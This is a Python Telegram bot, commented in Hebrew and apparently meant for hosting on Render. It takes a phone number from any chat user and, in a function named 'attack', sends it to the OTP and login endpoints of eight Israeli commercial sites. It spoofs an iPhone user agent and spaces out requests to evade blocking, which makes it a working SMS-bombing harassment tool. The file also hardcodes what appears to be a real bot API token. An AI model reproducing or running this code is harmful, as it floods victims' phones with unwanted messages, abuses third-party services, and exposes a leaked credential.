import telebot
import requests
import time
from flask import Flask
from threading import Thread
import os

# --- חלק 1: שרת Flask כדי ש-Render לא יכבה את הבוט ---
app = Flask('')

@app.route('/')
def home():
    return "Bot is alive and running!"

def run():
    # Render נותן פורט אוטומטי (בדרך כלל 10000 או 8080)
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run)
    t.start()

# --- חלק 2: הגדרת הבוט ---
API_TOKEN = '8788411826:AAEQdmRx50VFB91zjRJrEaMJFghDp8Tayg0'
bot = telebot.TeleBot(API_TOKEN)

def attack(target):
    # יצירת פורמט 972 עבור אתרים מסוימים (כמו וולט)
    target_972 = "972" + target[1:] if target.startswith('0') else target
    
    # רשימת האתרים עם ה-Payloads המדויקים
    apis = [
        {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "t": "json", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}},
        {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "t": "json", "d": {"phoneNumber": target, "uuid": "c8b24899-349b-4838-8303-d279d4e2fffd"}},
        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "t": "json", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}},
        {"n": "Terminal X", "u": "https://www.terminalx.com/api/v1/auth/otp/send", "t": "json", "d": {"phone": target}},
        {"n": "Golf", "u": "https://www.golf-il.co.il/customer/ajax/post/", "t": "data", "d": {"form_key": "WaqdnLcdTj3jsiZw", "bot_validation": "1", "type": "login", "telephone": target, "code": "", "compare_email": "", "compare_identity": ""}},
        {"n": "Yellow", "u": "https://api.yellow.co.il/v1/auth/login", "t": "json", "d": {"phone": target}},
        {"n": "KSP", "u": "https://ksp.co.il/api/v1/auth/otp", "t": "json", "d": {"phone": target}},
        {"n": "Wolt", "u": "https://wolt.com/api/v1/user/check_phone_number", "t": "json", "d": {"phone_number": target_972}}
    ]
    
    # Headers שמדמים גלישה מ-iPhone כדי להפחית חסימות
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
        "X-Requested-With": "XMLHttpRequest"
    }
    
    for site in apis:
        try:
            if site["t"] == "json":
                res = requests.post(site["u"], json=site["d"], headers=headers, timeout=10)
            else:
                # עבור גולף ואתרים שדורשים Form Data
                res = requests.post(site["u"], data=site["d"], headers=headers, timeout=10)
            
            print(f"Sent to {site['n']} - Status: {res.status_code}")
        except Exception as e:
            print(f"Error with {site['n']}: {e}")
        
        time.sleep(1.5) # דיליי חשוב למניעת חסימת ה-IP של השרת

@bot.message_handler(func=lambda m: True)
def handle(m):
    target = m.text.strip()
    # בדיקה שהקלט הוא מספר טלפון (לפחות 9 ספרות)
    if target.isdigit() and len(target) >= 9:
        bot.reply_to(m, f"🚀 מתחיל סבב שליחה עבור {target}...")
        attack(target)
        bot.send_message(m.chat.id, "✅ הסבב הסתיים בהצלחה!")
    else:
        bot.reply_to(m, "נא לשלוח מספר טלפון תקין (רק ספרות).")

# --- חלק 3: הרצת הכל ביחד ---
if __name__ == "__main__":
    # 1. הפעלת השרת ברקע
    keep_alive()
    print("--- SERVER STARTED ---")
    
    # 2. הפעלת הבוט (הלולאה האינסופית)
    print("--- BOT IS READY ---")
    bot.infinity_polling()
